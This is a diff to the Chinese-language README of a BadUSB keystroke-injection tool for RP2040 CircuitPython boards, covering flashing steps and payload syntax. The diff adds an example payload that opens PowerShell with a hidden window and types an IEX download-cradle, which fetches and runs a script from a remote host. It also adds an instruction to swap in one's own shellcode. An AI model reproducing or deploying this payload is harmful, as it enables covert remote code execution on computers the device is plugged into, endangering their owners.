@@ -7,30 +7,34 @@
 虽然名字叫做bad-rp2040，但理论上它可以支持其他能够使用CircuitPython的板子。
 
 * 第一步
+  
   按住BOOT按键进入烧入模式从[这里](https://circuitpython.org/board/raspberry_pi_pico/)找到合适的CircuitPython固件烧入
 
 * 第二步
+  
   烧入完成后再下载项目文件，修改payload.txt为你想要的内容，之后写入磁盘模式的开发板
 
 * 第三步
+  
   重新插拔开发板，不出意外开发板会自动模拟按键输入编写好的payload
 
 
-## payload语法
+### payload语法
 
 > 目前尚在开发中，很多功能并不全面画横线的表示正在开发中
 
-示例
+可用案例：
 ```badusb
-setTime 0.3 
+set Time 1
 POWERSHELL
-ECHO HelloWord
-ECHO PASS
-POWERSHELL
-ECHO 123123
+TOGGLE_INPUT
+ECHO powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://192.168.255.1:8029/a'))"
 ```
+将最后的echo内容替换为你的shellcode即可
+
 内置了快捷使用的模组
 * POWERSHELL
+* TOGGLE_INPUT 输入法切换
 * ~~WINDOWS~~
 * ~~LINUX~~
 * ~~CMD~~
@@ -38,11 +42,15 @@ ECHO 123123
 
 根据需求调用即可，echo语句用于输出字符串
 
-#### 语法表
+### 语法表
 
 | 命令     | 作用                       |
 -----------|---------------------------|
-| ~~setTime~~  | ~~设置按键间隔时间~~     |
+| set Time | 设置按键间隔时间     |
+
+#### 注意
+
+如自行编写payload.txt，请注意windows的自动大小写问题
 
 ### 后续开发计划
 
